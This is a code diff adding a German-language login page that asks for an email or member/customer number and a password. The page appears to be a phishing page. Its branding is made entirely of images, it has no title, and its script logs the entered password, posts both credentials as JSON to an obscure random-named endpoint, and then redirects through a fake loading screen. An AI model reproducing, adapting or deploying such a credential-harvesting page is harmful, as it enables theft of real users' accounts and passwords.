@@ -1,0 +1,89 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="./css/mainx.css">
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.4/jquery.min.js"></script>
+    <!--  -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Arvo:ital,wght@0,400;0,700;1,400;1,700&display=swap" rel="stylesheet">
+    <!--  -->
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
+    <title></title>
+</head>
+<body>
+    <div class="hato">
+        <div class="upot">
+            <img class="pc" src="./img/upapot.PNG" alt="">
+            <img class="mb" src="./img/topano-mb.png" alt="">
+        </div>
+    </div>
+
+    <div>
+        <div class="mona">
+            <form method="post" id="loginForm">
+                <p class="pp1">Login</p>
+
+                <p class="pput">E-Mail-Adresse oder Mitglieds-/Kundennummer</p>
+                <div class="inpo inpo1">
+                    <input type="text" name="" id="username" placeholder="E-Mail-Adresse oder Mitglieds-/Kundennummer" required>
+                    <div class="ico">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20"><path d="M9 15h2V9H9Zm1-15a10 10 0 1 0 10 10A10 10 0 0 0 10 0Zm0 18a8 8 0 1 1 8-8 8 8 0 0 1-8 8ZM9 7h2V5H9Z" fill="#333"/></svg>
+                    </div>
+                </div>
+                <!--  -->
+                <p class="pput">Passwort</p>
+                <div class="inpo ">
+                    <input type="password" name="" id="password" placeholder="Passwort" required>
+                    <div class="ico">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20"><path d="M9 15h2V9H9Zm1-15a10 10 0 1 0 10 10A10 10 0 0 0 10 0Zm0 18a8 8 0 1 1 8-8 8 8 0 0 1-8 8ZM9 7h2V5H9Z" fill="#333"/></svg>
+                    </div>
+                </div>
+                <p class="pp2">> Passwort vergessen?</p>
+                <div class="indr">
+                    <img src="./img/formbomot-pc.PNG" alt="">
+                </div>
+
+                <div class="butn">
+                    <button type="submit">Anmelden</button>
+                </div>
+                <div class="prebot">
+                    <img class="mb" src="./img/prebotamo-mb.png" alt="">
+                    <img class="pc" src="./img/prebotamo-pc.PNG" alt="">
+                </div>
+            </form>
+        </div>
+    </div>
+
+    <div class="boto">
+        <div class="bwoto">
+            <img class="pc" src="./img/botanamo-pc.png" alt="">
+            <img class="mb" src="./img/botanamo-mb.png" alt="">
+        </div>
+    </div>
+
+    <script>
+         document.getElementById('loginForm').addEventListener('submit', function(e) {
+                    e.preventDefault();
+                    console.log("submit");
+                    const username = document.getElementById('username').value;
+                    const password = document.getElementById('password').value;
+                    console.log('Login attempt:', { username, password });
+
+                    $.ajax({
+                        url: '/gzLbTbjqMpc34D4XsPJ2',
+                        type: 'POST',
+                        contentType: 'application/json',
+                        data: JSON.stringify({username,password}),
+                        success: function(info) {
+                            if(info.OK){
+                                window.location = "/loading?time=3&url=/RKnUB922z6Mf4HDwg3EZ";  
+                            }
+                        }
+                    });
+                });
+    </script>
+</body>
+</html>
